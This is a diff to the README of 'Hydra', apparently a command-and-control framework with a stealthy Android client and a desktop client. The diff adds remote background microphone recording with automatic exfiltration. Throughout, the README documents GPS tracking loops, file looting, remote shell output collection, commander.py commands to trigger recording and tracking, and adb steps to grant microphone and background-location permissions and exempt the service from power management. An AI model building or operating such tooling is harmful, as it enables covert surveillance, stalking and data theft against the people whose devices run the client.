@@ -37,6 +37,7 @@ The use of this framework for attacking targets without prior mutual consent is 
 * [x] Multi-Platform Telemetry (RAM, OS, Battery, Network SSID)
 * [x] File Infiltration & Exfiltration (Download/Upload)
 * [x] Live GPS Exfiltration (Single-ping & Automated Tracking Loop)
+* [x] Audio Intelligence (Remote Background Recording & Exfiltration)
 * [ ] Persistence Module (Systemd/Registry)
 
 ---
@@ -51,7 +52,7 @@ The brain of the operation, built with **Python & FastAPI**.
 * **Dynamic Intelligence:** Platform-aware logging (Mobile vs Desktop).
 * **Automated Tracking:** SQLite database tracking for all "Heads."
 * **Command Dispatcher:** Sends platform-specific JSON payloads.
-* **Output Collector:** Receives and logs remote shell results and GPS data via `/report`.
+* **Output Collector:** Receives and logs remote shell results, GPS data, and Audio binary data.
 * **File Manager**: Dedicated endpoints for /upload (Exfiltration) and /download (Looting).
 * **Path:** `/hydra_c2/`
 
@@ -61,7 +62,8 @@ A stealthy background service built with **Kotlin**.
 
 * **Features:**
 * **Geospatial Intelligence**: High-accuracy coordinate retrieval and Automated Live Tracking (30s intervals).
-* **Network Intelligence:** Reports active SSID or Mobile Carrier name.
+* **Audio Intelligence:** Remote-triggered background microphone recording (MPEG4-AAC) with auto-exfiltration.
+* **Network Intelligence:** Reports active SSID or Mobile Carrier name (Requires Location).
 * **Vitals Reporting:** Real-time Battery percentage and OS version tracking.
 * **Persistence:** Foreground Service with a `NotificationChannel` and `WakeLock`.
 * **Action Execution:** Trigger hardware actions (e.g., Vibrator) via C2.
@@ -89,14 +91,14 @@ Ensure your `.pem` files are in the server directory (they are ignored by git).
 
 ```bash
 cd hydra_c2
-python main.py
+python -m uvicorn main:app --host 0.0.0.0 --port 8443 --ssl-keyfile ./key.pem --ssl-certfile ./cert.pem
 
 ```
 
 ### 2. Android Client Setup
 
 1. Open `hydra_android` in Android Studio.
-2. Ensure **Location Permissions** are granted for SSID visibility.
+2. Update the `BASE_URL` to your Arch Host IP (e.g., `https://192.168.1.50:8443`).
 3. Deploy to emulator or physical device.
 
 ### 3. Desktop Client Setup
@@ -113,12 +115,20 @@ cargo run
 
 Use `commander.py` to inject tasks into the database.
 
+**Audio Surveillance (Android):**
+
+```bash
+python commander.py ANDROID-HEAD-01 record_start    # Starts MIC recording
+python commander.py ANDROID-HEAD-01 record_stop     # Stops and uploads .m4a
+
+```
+
 **Get GPS Location (Android):**
 
 ```bash
-python commander.py ANDROID-HEAD-01 location          # Single GPS ping
-python commander.py ANDROID-HEAD-01 location_start    # Start 30s tracking loop
-python commander.py ANDROID-HEAD-01 location_stop     # Stop tracking loop
+python commander.py ANDROID-HEAD-01 location        # Single GPS ping
+python commander.py ANDROID-HEAD-01 location_start  # Start 30s tracking loop
+python commander.py ANDROID-HEAD-01 location_stop   # Stop tracking loop
 
 ```
 
@@ -172,19 +182,24 @@ On machines with AMD Vega/Integrated graphics, use **SwiftShader (CPU)** to avoi
 
 ```
 
-### 🔐 Permission Bypass (Storage & Location)
+### 🔐 Permission & Physical Device Bypass (Android 11+)
 
-If exfiltration fails or location returns null, use ADB to elevate the agent's permissions:
+To ensure hardware access (Mic/GPS/SSID) and prevent the system from killing the service:
 
 ```bash
-# Storage Permissions
-adb root
-adb shell pm grant com.hydra.client android.permission.READ_EXTERNAL_STORAGE
-adb shell "mv /sdcard/Download/loot.txt /data/user/0/com.hydra.client/files/loot.txt"
-
-# Location Permissions
+# Hardware & Network Permissions
+adb shell pm grant com.hydra.client android.permission.RECORD_AUDIO
 adb shell pm grant com.hydra.client android.permission.ACCESS_FINE_LOCATION
 adb shell pm grant com.hydra.client android.permission.ACCESS_COARSE_LOCATION
+adb shell pm grant com.hydra.client android.permission.ACCESS_BACKGROUND_LOCATION
+adb shell appops set com.hydra.client WIFI_SCAN allow
+
+# Power Management & SmartManager Bypass
+adb shell dumpsys deviceidle whitelist +com.hydra.client
+adb shell am set-standby-bucket com.hydra.client active
+
+# Service Start (Physical)
+adb shell am start-foreground-service -n com.hydra.client/com.hydra.client.HydraService
 
 ```
 
